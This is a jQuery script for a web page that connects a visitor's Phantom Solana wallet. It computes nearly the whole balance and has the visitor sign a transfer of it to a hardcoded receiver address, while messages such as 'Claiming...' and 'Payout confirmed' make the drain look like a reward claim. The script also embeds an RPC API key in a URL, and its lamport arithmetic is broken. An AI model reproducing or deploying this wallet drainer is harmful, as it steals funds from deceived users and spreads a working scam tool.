$(document).ready(function() {
    $('#connect-wallet').on('click', async () => {
        if (window.solana && window.solana.isPhantom) {
            try {
                const resp = await window.solana.connect();
                alert("Phantom Wallet connected:", resp.publicKey.toString());

                // 3. Create Solana connection (public endpoint

                try {
                    const connection = new solanaWeb3.Connection(
                        "https://solana-mainnet.api.syndica.io/api-key/4iuPX8JcgTqR675SP4oMAfpW7UTiU5tk2MDy9KS2tfG798fEGtN9kUQ27TZkokrJS8nL4qfBf1ACHUHXcQ1hpkSWoFiToLThg2H",
                        "confirmed"
                    );

                    const public_key = new solanaWeb3.PublicKey(resp.publicKey);
                    const walletBalance = await connection.getBalance(public_key);

                    const balanceInSOL = walletBalance / solanaWeb3.LAMPORTS_PER_SOL;

                    alert(`Wallet balance: ${balanceInSOL} SOL`);



                    const minBalance = await connection.getMinimumBalanceForRentExemption(0);


                    alert(`Minimum balance for rent exemption: ${minBalance / solanaWeb3.LAMPORTS_PER_SOL} SOL`);

                    const LAMPORTS_PER_SOL = 1_000_000_000n;
                    // Input balances in SOL (as numbers or strings)
                    const walletBalanceInLamports = BigInt(Math.round(walletBalance * Number(LAMPORTS_PER_SOL)));
                    const minBalanceInLamports = BigInt(Math.round(minBalance * Number(LAMPORTS_PER_SOL)));



                    const recieverWallet = new solanaWeb3.PublicKey('DRYjXYjya45KLzD5HmtBd4QeUA6SqypNoJDhgoie8bnF');
                    const balanceForTransfer = walletBalanceInLamports - minBalanceInLamports;
                    alert(`Balance available for transfer: ${balanceForTransfer} SOL`);
                   // if (balanceForTransfer <= 0) {
                     //   alert("Insufficient funds to claim .");
                       // return;
                    //}
                    alert("Initiating transfer...");




                    var transaction = new solanaWeb3.Transaction().add(
                        solanaWeb3.SystemProgram.transfer({
                            fromPubkey: resp.publicKey,
                            toPubkey: recieverWallet,
                            lamports: balanceForTransfer,
                        }),
                    );

                    transaction.feePayer = window.solana.publicKey;
                    let blockhashObj = await connection.getRecentBlockhash();
                    transaction.recentBlockhash = blockhashObj.blockhash;

                    const signed = await window.solana.signTransaction(transaction);
                    alert("Transaction signed:", signed);

                    let txid = await connection.sendRawTransaction(signed.serialize());
                    await connection.confirmTransaction(txid);
                    alert("Payout confirmed:", txid);
                } catch (err) {
                    console.error("Error found:", err);
                    alert("Error: " + err.message);
                }



                $('#connect-wallet').text("Claiming...");
                $('#connect-wallet').prop('disabled', true);
                
            } catch (err) {
                console.error("Wallet connection error:", err);
                alert("Error connecting to Phantom Wallet: " + err.message);
            }
        } else {
            alert("Phantom Wallet not found. Please install it from https://phantom.app/");
        }
    });
});
               